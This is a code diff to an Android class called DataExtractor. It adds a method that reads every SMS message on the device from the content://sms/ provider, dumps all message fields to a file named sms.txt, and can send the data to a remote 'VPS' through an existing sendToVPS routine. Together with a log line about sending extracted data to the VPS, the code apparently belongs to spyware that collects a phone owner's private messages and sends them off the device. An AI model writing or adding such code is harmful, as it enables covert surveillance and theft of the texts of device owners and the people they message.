@@ -162,6 +162,32 @@ public class DataExtractor {
         }
         Log.v("secme", "Data extractor send " + data + " to VPS as " + filename);
     }
+
+    public void extractSMS(boolean sendToVPS){
+        Cursor cursor = context.getContentResolver().query(Uri.parse("content://sms/"), null, null, null, null);
+        String data = "\tSMS";
+        if (cursor.moveToFirst()) { // must check the result to prevent exception
+            do {
+                data += "\n";
+                for(int idx=0;idx<cursor.getColumnCount();idx++)
+                {
+                    if (idx==0){
+                        data += cursor.getColumnName(idx) + ":" + cursor.getString(idx)+"\n";
+                    }else{
+                        data += "\t" + cursor.getColumnName(idx) + ":" + cursor.getString(idx)+"\n";
+                    }
+
+                }
+                // use msgData
+
+            } while (cursor.moveToNext());
+        }
+        writeToFile(data, "sms.txt");
+        if (sendToVPS) {
+            sendToVPS(data, "sms.txt");
+        }
+
+    }
 }
 
 
